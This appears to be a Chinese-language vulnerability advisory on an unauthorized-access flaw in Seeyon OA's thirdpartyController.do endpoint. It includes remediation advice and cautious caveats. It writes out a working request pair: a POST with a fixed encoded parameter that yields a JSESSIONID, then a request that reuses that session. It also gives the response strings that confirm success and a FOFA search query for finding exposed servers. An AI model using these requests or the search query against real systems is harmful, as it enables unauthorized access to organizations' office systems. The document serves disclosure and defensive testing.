---
source: "https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/seeyou/Seeyon-Unauthori-Access.yaml"
version: "具体受影响版本范围未披露"
fofa: "app=\"致远互联-OA\""
---

# 致远OA thirdpartyController.do 未授权访问漏洞

## 漏洞描述

致远 OA 的 `thirdpartyController.do` 被公开 PoC 列为会话获取入口。PoC 提交特定第三方访问参数，提取返回的 `JSESSIONID` 后访问主界面，用于检测未经正常登录流程取得应用会话的风险。

## 影响范围

具体受影响版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。

## 公开验证方法

```http
POST /seeyon/thirdpartyController.do HTTP/1.1
Host: example.invalid
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: deflate

method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
```

```http
GET /seeyon/main.do HTTP/1.1
Host: example.invalid
Cookie: JSESSIONID=<上一响应返回的会话值>
```

来源要求第二次响应为 200，同时包含“当前已登录了一个用户，同一窗口中不能登录多个用户”和退出链接 `<a href='/seeyon/main.do?method=logout'`。应隔离既有会话，并与不携带 Cookie 的访问对照；获得 JSESSIONID 或命中通用页面不能单独证明权限提升，更不能据此断言管理员身份。本文仅核对公开源码，未获取目标会话或进行本地复现。

## 修复建议

向致远获取适用更新。限制第三方访问接口的信任来源，校验身份绑定及会话生成条件，避免仅凭固定参数授予会话。

## 参考链接

- [LittleBear4/OA-EXPTOOL 原始 PoC（固定提交）](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/seeyou/Seeyon-Unauthori-Access.yaml)

## 网络测绘

```text
app="致远互联-OA"
```
